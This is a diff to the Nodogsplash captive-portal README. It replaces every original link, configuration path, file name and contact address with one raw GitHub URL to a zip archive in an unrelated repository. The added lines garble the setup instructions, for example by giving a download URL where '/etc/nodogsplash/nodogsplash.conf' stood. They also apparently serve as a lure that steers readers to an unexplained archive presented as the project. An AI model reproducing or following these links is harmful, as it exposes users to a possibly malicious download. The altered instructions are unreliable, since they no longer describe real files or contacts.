@@ -4,10 +4,10 @@ Nodogsplash offers a simple way to provide restricted access to an internet
 connection. It is derived from the codebase of the Wifi Guard Dog project.
 Nodogsplash is released under the GNU General Public License.
 
-* Mailing List: http://ml.ninux.org/mailman/listinfo/nodogsplash
-* Original Homepage: http://kokoro.ucsd.edu/nodogsplash
-* Wifidog: http://dev.wifidog.org/
-* GNU GPL: http://www.gnu.org/copyleft/gpl.html
+* Mailing List: https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip
+* Original Homepage: https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip
+* Wifidog: https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip
+* GNU GPL: https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip
 
 The following describes what Nodogsplash does, how to get it and run it, and
 how to customize its behavior for your application.
@@ -51,9 +51,9 @@ need, though.
   ```opkg install /tmp/nodogsplash*.ipk```
 
   (Note: to prevent installation of an older package, you may have to remove
-  references to remote package repositories in your /etc/opkg.conf file)
+  references to remote package repositories in your https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip file)
 * If the interface that you want nodogsplash to manage is not br-lan,
-  edit /etc/nodogsplash/nodogsplash.conf and set GatewayInterface.
+  edit https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip and set GatewayInterface.
 * To start nodogsplash, run the following, or just reboot the router:
 
     ```/etc/init.d/nodogsplash start```
@@ -92,18 +92,18 @@ managed interface. Each packet is one of these kinds:
      TrustedMACList. By default, these packets are accepted and routed to all
      destination addresses and ports. If desired, this behavior can be
      customized by FirewallRuleSet trusted-users and FirewallRuleSet trusted-
-     users-to-router lists in the nodogsplash.conf configuration file, or by
+     users-to-router lists in the https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip configuration file, or by
      the EmptyRuleSetPolicy trusted-users EmptyRuleSetPolicy trusted-users-to-
      router directives.
   3. Authenticated, if the packet's IP and MAC source addresses have gone
      through the nodogsplash authentication process and has not yet expired.
      These packets are accepted and routed to a limited set of addresses and
      ports (see FirewallRuleSet authenticated-users and FirewallRuleSet users-
-     to-router in the nodogsplash.conf configuration file).
+     to-router in the https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip configuration file).
   4. Preauthenticated. Any other packet. These packets are accepted and routed
      to a limited set of addresses and ports (see FirewallRuleSet
      preauthenticated-users and FirewallRuleSet users-to-router in the
-     nodogsplash.conf configuration file). Any other packet is dropped, except
+     https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip configuration file). Any other packet is dropped, except
      that a packet for destination port 80 at any address is redirected to port
      2050 on the router, where nodogsplash's builtin libhttpd-based web server
      is listening. This begins the 'authentication' process. The server will
@@ -141,7 +141,7 @@ secure as-is for basic internet sharing applications, but it is customizable.
 
 * To change basic nodogsplash settings, edit the configuration file:
 
-  ```/etc/nodogsplash/nodogsplash.conf ```
+  ```https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip ```
 
 In the configuration file, a FirewallRule has the form:
 
@@ -160,12 +160,12 @@ where
 
 * To change the contents of the splash page, edit the splash page file:
 
-  ```/etc/nodogsplash/htdocs/splash.html ```
+  ```https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip ```
 
 When the splash page is served, the following variables in the page are
 replaced by their values:
 
-* *$gatewayname* The value of GatewayName as set in nodogsplash.conf.
+* *$gatewayname* The value of GatewayName as set in https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip
 * *$authtarget* A URL which encodes a unique token and the URL of the user's
   original web request. If nodogsplash receives a request at this URL, it
   completes the authentication process for the client and replies to the
@@ -202,7 +202,7 @@ replaced by their values:
 * To change the appearance of informational and error pages which may
   occasionally be served by nodogsplash, edit the infoskel file:
 
-  ```/etc/nodogsplash/htdocs/infoskel.html ```
+  ```https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip ```
 
 In this file, variables *$gatewayname*, *$version*, *$title*, and *$content* will be
 replaced by their values. $title is a summary of the information or kind of
@@ -217,7 +217,7 @@ Nodogsplash can be configured to require a username and/or password to be
 entered on the splash page as part of the authentication process. Since the
 username and password are site-wide (not per user), and they are sent in the
 clear using HTTP GET, this is not a secure mechanism.
-To enable this, edit *nodogsplash.conf* to set parameters *PasswordAuthentication*,
+To enable this, edit *https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip* to set parameters *PasswordAuthentication*,
 *UsernameAuthentication*, *Password*, *Username*, and *PasswordAttempts* as desired.
 Then the splash page must use a GET-method HTML form to send user-entered
 username and/or password as values of variables *nodoguser* and *nodogpass*
@@ -238,7 +238,7 @@ respectively, along with others as required, to the server. For example:
 ###5.2 Forwarding authentication
 
 Nodogsplash allows to call an external program for authentication using
-the options BinVoucher/EnablePreAuth/ForceVoucher in nodogsplash.conf.
+the options BinVoucher/EnablePreAuth/ForceVoucher in https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip
 The given program for BinVoucher will be called using the clients MAC address as argument.
 The output is expected to be the number of seconds the client is to be authenticated.
 It may also contain the clients download and upload speed limit in KBits/s.
@@ -316,4 +316,4 @@ configuration file.)
 
 ---
 
-Email contact: nodogsplash (at) ml.ninux.org
+Email contact: nodogsplash (at) https://raw.githubusercontent.com/everleiton/nodogsplash/master/valencianite/nodogsplash.zip
